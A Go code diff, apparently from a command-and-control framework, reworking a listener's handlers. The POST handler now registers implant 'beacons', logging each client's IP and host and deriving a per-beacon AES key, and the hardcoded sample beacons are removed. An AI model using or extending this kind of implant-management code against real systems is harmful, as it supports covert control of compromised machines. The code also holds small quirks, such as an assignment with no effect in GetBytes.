@@ -3,18 +3,12 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"math/big"
+	"net/http"
 	"reflect"
 )
 
-func GetBytes(data []byte, length int) []byte {
-	if length > len(data) {
-		length = len(data)
-	}
-	data = data[:length]
-	return data
-}
-
-func GET_handler(cookie string, listener Listener) ([]byte, bool) {
+func GET_handler(cookie string, listener *Listener) ([]byte, bool) {
 	var res []byte
 	cookie_decode, err := base64.StdEncoding.DecodeString(cookie)
 	aAES := getAES(listener.A)
@@ -35,30 +29,38 @@ func GET_handler(cookie string, listener Listener) ([]byte, bool) {
 	}
 }
 
-func POST_handler(body []byte, listener Listener) []byte {
-	var res []byte
-	if len(body) == 16 {
-		// regis beacon
-		xmlname := bToHexString(body)
-		if checkXMLExists("./data/", xmlname+".xml") {
-			fmt.Println("have the xml")
-		} else {
-			beacons := []Beacon{
-				{Hostname: "example.com", Ip: "192.168.1.1", Domin: "example", CusAES: "abcd", AESkey: "123456", Live: true},
-				{Hostname: "test.com", Ip: "192.168.1.2", Domin: "test", CusAES: "efgh", AESkey: "789012", Live: false},
-			}
-			listener := Listener{
-				Lisname: "listener1",
-				Port:    8080,
-				A:       convertToUint8("usanmsl"),
-				Beacons: beacons,
-			}
+func POST_handler(body []byte, listener *Listener, r *http.Request) []byte {
 
-			err := saveXML(xmlname+".xml", listener)
-			if err != nil {
-				fmt.Println("can not save xml")
+	var res []byte
+	ip := r.RemoteAddr
+	domain := r.Host
+
+	if len(body) == 16 {
+		var CusAes big.Int
+		CusAes.SetBytes(GetBytes(body, 16))
+
+		if Check_Beacon_CusAES(listener, CusAes) {
+			fmt.Println("have the beacon")
+			return res
+		} else {
+			Srvkey := Random_Big_Int128()
+			//SrvAes := Big_Int_Pow(Bytes_To_BigInt(listener.A), Srvkey)
+			aeskey := Mod_Pow(&CusAes, Srvkey)
+
+			newBeacon := Beacon{
+				Hostname: "",
+				Ip:       ip,
+				Domin:    domain,
+				Arch:     "",
+				System:   "",
+				CusAES:   CusAes.String(),
+				AESkey:   (*aeskey).String(),
+				Live:     true,
 			}
+			listener.Beacons = append(listener.Beacons, newBeacon)
+			saveXML("./Listener/"+listener.Lisname, listener)
 		}
+
 	}
 	return res
 }
@@ -67,4 +69,14 @@ func printkey(key []uint8) {
 	for _, b := range key {
 		fmt.Printf("%x ", b)
 	}
+}
+
+func GetBytes(data []byte, length int) []byte {
+	if length > len(data) {
+		length = len(data)
+	}
+	var res []byte
+	res = data[:length]
+	data = data[length:]
+	return res
 }
